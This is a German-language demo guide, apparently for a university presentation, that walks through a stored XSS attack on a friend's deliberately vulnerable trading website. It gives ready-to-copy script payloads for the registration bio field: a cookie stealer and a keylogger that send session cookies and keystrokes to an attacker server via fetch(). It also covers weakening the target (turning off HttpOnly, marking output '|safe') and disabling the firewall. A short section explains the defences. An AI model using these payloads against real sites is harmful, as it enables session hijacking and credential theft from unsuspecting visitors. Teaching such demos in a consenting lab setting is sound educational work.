# 🎯 FINALE DEMO-ANLEITUNG - Für die Präsentation

## ⚠️ NUR FÜR BILDUNGSZWECKE

---

## 📊 Setup-Übersicht

```
┌─────────────────────────────────────────────────────────────┐
│ Kumpels Server (Opfer):                                     │
│ http://141.87.56.31:5001                                    │
│ - Verwundbare Börsen-Website                                │
│ - Bio-Feld bei /register ist XSS-anfällig                   │
└─────────────────────────────────────────────────────────────┘

                          ↓ Cookie wird gesendet

┌─────────────────────────────────────────────────────────────┐
│ Dein Computer (Attacker):                                   │
│ http://141.87.56.125:8888                                   │
│ - Attacker-Server empfängt gestohlene Daten                │
└─────────────────────────────────────────────────────────────┘
```

---

## 🚀 SCHRITT 1: Attacker-Server starten

**Auf DEINEM Computer:**

```bash
cd /Users/marcmenning/Documents/GitHub/hackingWithPython2
python3 attacker_server.py
```

**Erwartete Ausgabe:**
```
╔══════════════════════════════════════════════════════════╗
║           🎯 ATTACKER SERVER GESTARTET 🎯               ║
║  Port: 8888                                              ║
╚══════════════════════════════════════════════════════════╝

📝 Logdateien:
   • Cookies:   /path/to/stolen_cookies.txt
   • Keylogs:   /path/to/keylog.txt

🚀 Server startet...

 * Running on http://0.0.0.0:8888
```

**→ Terminal OFFEN lassen und für BEAMER bereit halten!**

---

## 🎯 SCHRITT 2: Auf seine Website gehen und Payload platzieren

### **2.1 - Website öffnen:**

Browser öffnen: **http://141.87.56.31:5001**

### **2.2 - Zur Registrierung:**

Klicke auf **"Jetzt registrieren"** oder gehe direkt zu:
**http://141.87.56.31:5001/register**

### **2.3 - Formular ausfüllen:**

```
┌─────────────────────────────────────────────────────┐
│ 📝 Als Autor registrieren                           │
├─────────────────────────────────────────────────────┤
│                                                     │
│ Autor-Name / Username:                              │
│ ┌─────────────────────────────────────────────┐    │
│ │ hacker                                       │    │
│ └─────────────────────────────────────────────┘    │
│                                                     │
│ Passwort:                                           │
│ ┌─────────────────────────────────────────────┐    │
│ │ password123                                  │    │
│ └─────────────────────────────────────────────┘    │
│                                                     │
│ Über dich / Trading-Fokus (Optional):               │
│ ┌─────────────────────────────────────────────┐    │
│ │ <HIER KOMMT DER PAYLOAD REIN!>              │    │
│ │                                              │    │
│ └─────────────────────────────────────────────┘    │
│                                                     │
│         [ Account erstellen ]                       │
└─────────────────────────────────────────────────────┘
```

### **2.4 - PAYLOAD ins Bio-Feld einfügen:**

**OPTION A - Cookie-Stealer (empfohlen für erste Demo):**
```html
<script>fetch('http://141.87.56.125:8888/steal_cookie?c='+document.cookie)</script>
```

**OPTION B - Keylogger:**
```html
<script>let buffer='';document.addEventListener('keypress',function(e){buffer+=e.key;});setInterval(function(){if(buffer.length>0){fetch('http://141.87.56.125:8888/log_keys',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'keys='+encodeURIComponent(buffer)});buffer='';}},3000);</script>
```

**OPTION C - Kombiniert (Cookie + Keylogger):**
```html
<script>fetch('http://141.87.56.125:8888/steal_cookie?c='+document.cookie);let buffer='';document.addEventListener('keypress',function(e){buffer+=e.key;});setInterval(function(){if(buffer.length>0){fetch('http://141.87.56.125:8888/log_keys',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'keys='+encodeURIComponent(buffer)});buffer='';}},3000);</script>
```

### **2.5 - Account erstellen:**

Klicke auf **"Account erstellen"**

**→ Du bist jetzt registriert und der Payload ist in der Datenbank gespeichert!**

---

## 👤 SCHRITT 3: Kumpel besucht dein Profil (Opfer-Rolle)

**WICHTIG:** Jetzt muss dein Kumpel (oder ein zweiter Browser) die Seite besuchen, wo deine Bio angezeigt wird.

### **3.1 - Mögliche Szenarien:**

**Szenario A - Falls es eine User-Liste gibt:**
- Dein Kumpel geht zu: `http://141.87.56.31:5001/users`
- Er sieht dort alle registrierten Autoren
- Deine Bio mit dem Payload wird angezeigt
- **→ Cookie wird gestohlen!**

**Szenario B - Falls die Bio auf der Startseite angezeigt wird:**
- Dein Kumpel geht zu: `http://141.87.56.31:5001`
- Möglicherweise werden neue Autoren vorgestellt
- Deine Bio wird geladen
- **→ Cookie wird gestohlen!**

**Szenario C - Falls er dein Profil besuchen muss:**
- Dein Kumpel geht zu: `http://141.87.56.31:5001/profile/hacker`
- Dein Profil mit Bio wird angezeigt
- **→ Cookie wird gestohlen!**

**Szenario D - Falls Admin alle User sehen kann:**
- Dein Kumpel loggt sich als Admin ein
- Er geht zu einem Admin-Panel oder User-Management
- **→ Cookie wird gestohlen!**

### **3.2 - Frage deinen Kumpel:**

> "Wo kann ich nach der Registrierung die Bio von anderen Autoren sehen? Gibt es eine `/users` Seite oder werden neue Autoren irgendwo angezeigt?"

---

## 🎉 SCHRITT 4: Erfolg sehen!

**Sobald jemand die Seite mit deiner Bio besucht:**

### **In DEINEM Terminal erscheint sofort:**

```
====================================================================
🍪 COOKIE GESTOHLEN!
--------------------------------------------------------------------
Zeitpunkt:   2025-12-02 18:15:30
Opfer IP:    141.87.56.31
User-Agent:  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36...
Referer:     http://141.87.56.31:5001/users
Cookie:      session=eyJ1c2VyIjp7ImlkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0...
====================================================================
```

**→ ZEIGE DAS DEM PROF!**

### **Zusätzlich wird gespeichert in:**
- `stolen_cookies.txt`:
  ```
  [2025-12-02 18:15:30] IP: 141.87.56.31 | Cookie: session=eyJ... | UA: Mozilla/5.0...
  ```

---

## 🎓 ERKLÄRUNG FÜR DEN PROF

### **Was gerade passiert ist:**

**1. Stored XSS (Persistent):**
```
Du hast JavaScript-Code in die Datenbank eingefügt (Bio-Feld).
Jeder der deine Bio sieht, führt diesen Code aus.
Das ist "Stored" XSS, weil es persistent gespeichert ist.
```

**2. Session Hijacking:**
```
Der Session-Cookie wurde gestohlen.
Mit diesem Cookie könntest du dich als das Opfer ausgeben.
Wenn das ein Admin ist → voller Zugriff auf die Website!
```

**3. Warum ist das gefährlich?**
```
✗ Unsichtbar: Opfer merkt nichts
✗ Persistent: Betrifft ALLE zukünftigen Besucher
✗ Keine User-Interaktion nötig: Passiert automatisch beim Seitenaufruf
✗ Admin-Account-Übernahme möglich
```

### **Wie könnte man das verhindern?**

**1. Input Sanitization:**
```python
import html
bio = html.escape(user_input)  # Konvertiert < zu &lt; etc.
```

**2. Output Encoding im Template:**
```html
{{ bio }}  <!-- Automatisches Escaping durch Jinja2 -->
NICHT: {{ bio|safe }}  <!-- Das wäre verwundbar! -->
```

**3. Content Security Policy (CSP) Header:**
```python
response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'"
```

**4. HttpOnly Cookies:**
```python
app.config['SESSION_COOKIE_HTTPONLY'] = True
# Verhindert JavaScript-Zugriff auf document.cookie
```

---

## 🧪 TEST VOR DER PRÄSENTATION

### **Quick-Test (10 Minuten vorher):**

**1. Server starten:**
```bash
python3 attacker_server.py
```

**2. Von einem anderen Gerät testen ob erreichbar:**
```bash
# Von Kumpels Laptop oder Handy:
curl http://141.87.56.125:8888

# Sollte HTML zurückgeben (Statusseite)
```

**3. Registrierung testen:**
- Registriere einen Test-User mit Payload
- Lass Kumpel die Seite besuchen wo Bio angezeigt wird
- Prüfe ob Cookie in deinem Terminal erscheint

**4. Falls Cookie nicht erscheint:**
- Browser DevTools öffnen (F12)
- Console Tab: Gibt es JavaScript-Fehler?
- Network Tab: Wird Request zu `141.87.56.125:8888` gesendet?
- Falls "blocked": CORS-Problem oder Firewall

---

## 🔧 TROUBLESHOOTING

### **Problem: Payload wird als Text angezeigt**

**Ursache:** Das Template escaped HTML korrekt (Website ist NICHT verwundbar)

**Lösung:** Dein Kumpel muss in seinem Template prüfen:

`templates/profile.html` oder wo die Bio angezeigt wird:
```html
<!-- VERWUNDBAR (was wir brauchen): -->
{{ bio|safe }}

<!-- SICHER (würde XSS verhindern): -->
{{ bio }}
```

Falls `|safe` fehlt, muss er es hinzufügen (nur für die Demo!).

---

### **Problem: Keine Daten kommen an**

**Check 1 - Server erreichbar?**
```bash
# Von Kumpels Computer:
curl http://141.87.56.125:8888
```

**Check 2 - Firewall?**
```bash
# Auf deinem Mac:
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate

# Falls "enabled" → temporär ausschalten:
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off
```

**Check 3 - Browser DevTools:**
- F12 → Network Tab
- Filter nach "8888"
- Wird Request gesendet?
- Status Code? (200 = OK, 0 = blocked)

---

### **Problem: Cookie ist leer**

**Ursache:** HttpOnly ist aktiviert

**Lösung:** Dein Kumpel muss in seiner `app.py` prüfen:
```python
app.config['SESSION_COOKIE_HTTPONLY'] = False  # Für Demo!
```

**Test im Browser:**
```javascript
// In Browser Console (F12):
console.log(document.cookie);
// Sollte den Session-Cookie zeigen
```

---

## 📸 BACKUP-PLAN

**Falls Live-Demo Probleme hat:**

**1. Screenshots vorbereiten:**
- Terminal mit "🍪 COOKIE GESTOHLEN!" Nachricht
- Browser mit Payload im Bio-Feld
- `stolen_cookies.txt` mit Beispiel-Daten

**2. Video aufnehmen:**
- Komplette Demo vorher durchführen
- Bildschirm aufnehmen (QuickTime Player → Neue Bildschirmaufnahme)
- Als Backup-Video bereit halten

---

## ⏱️ ZEITPLAN FÜR DEMO (5 Minuten)

```
00:00 - 00:30   Setup zeigen (beide Server laufen)
00:30 - 01:30   Auf seine Website gehen, registrieren, Payload ins Bio-Feld
01:30 - 02:00   Erklären: "Der Code ist jetzt in der Datenbank gespeichert"
02:00 - 02:30   Kumpel besucht die Seite (oder /users)
02:30 - 03:00   Terminal zeigen: Cookie gestohlen!
03:00 - 05:00   Erklärung: Warum gefährlich + Schutzmaßnahmen
```

---

## ✅ CHECKLISTE VOR PRÄSENTATION

### Dein Computer:
- [ ] `attacker_server.py` läuft
- [ ] Terminal gut lesbar (große Schrift für Beamer)
- [ ] `stolen_cookies.txt` und `keylog.txt` gelöscht (frische Demo)
- [ ] Payload kopiert und bereit zum Einfügen
- [ ] Browser geöffnet: `http://141.87.56.31:5001/register`

### Kumpels Computer:
- [ ] Seine Website läuft: `http://141.87.56.31:5001`
- [ ] Bio-Feld wird irgendwo angezeigt (wo?)
- [ ] Template nutzt `{{ bio|safe }}` (verwundbar)
- [ ] `SESSION_COOKIE_HTTPONLY = False` (für Demo)

### Netzwerk:
- [ ] Beide im gleichen Netzwerk (141.87.56.x)
- [ ] Curl-Test funktioniert: `curl http://141.87.56.125:8888`
- [ ] Firewall auf deinem Mac aus (für Demo)

### Backup:
- [ ] Screenshots gemacht
- [ ] Video aufgenommen (optional)

---

## 🎯 READY-TO-COPY PAYLOADS

### **Cookie-Stealer (92 Zeichen - passt ins Bio-Feld):**
```html
<script>fetch('http://141.87.56.125:8888/steal_cookie?c='+document.cookie)</script>
```

### **Keylogger (318 Zeichen - passt auch):**
```html
<script>let buffer='';document.addEventListener('keypress',function(e){buffer+=e.key;});setInterval(function(){if(buffer.length>0){fetch('http://141.87.56.125:8888/log_keys',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'keys='+encodeURIComponent(buffer)});buffer='';}},3000);</script>
```

### **Kombiniert (434 Zeichen - passt in 512):**
```html
<script>fetch('http://141.87.56.125:8888/steal_cookie?c='+document.cookie);let buffer='';document.addEventListener('keypress',function(e){buffer+=e.key;});setInterval(function(){if(buffer.length>0){fetch('http://141.87.56.125:8888/log_keys',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'keys='+encodeURIComponent(buffer)});buffer='';}},3000);</script>
```

---

## 🎬 LOS GEHT'S!

**Du hast alles, was du brauchst!**

1. ✅ Attacker-Server bereit
2. ✅ Payloads mit richtiger IP
3. ✅ Angriffspunkt identifiziert (Bio-Feld)
4. ✅ Ablauf klar

**Letzte Frage an deinen Kumpel:**
> "Wo kann man nach der Registrierung die Bio von neuen Autoren sehen? Damit wir wissen, wo der Prof hingehen muss."

**Viel Erfolg bei der Präsentation! 🚀**
